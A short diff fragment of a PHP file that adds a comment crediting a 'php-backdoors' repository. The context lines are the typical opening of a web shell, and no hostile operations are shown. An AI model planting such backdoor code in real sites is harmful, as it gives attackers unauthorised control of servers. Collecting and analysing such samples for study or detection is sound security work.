@@ -1,4 +1,5 @@
 <?php
+// from https://github.com/1337r0j4n/php-backdoors
 set_time_limit(0);
 session_start();
 if(get_magic_quotes_gpc()){
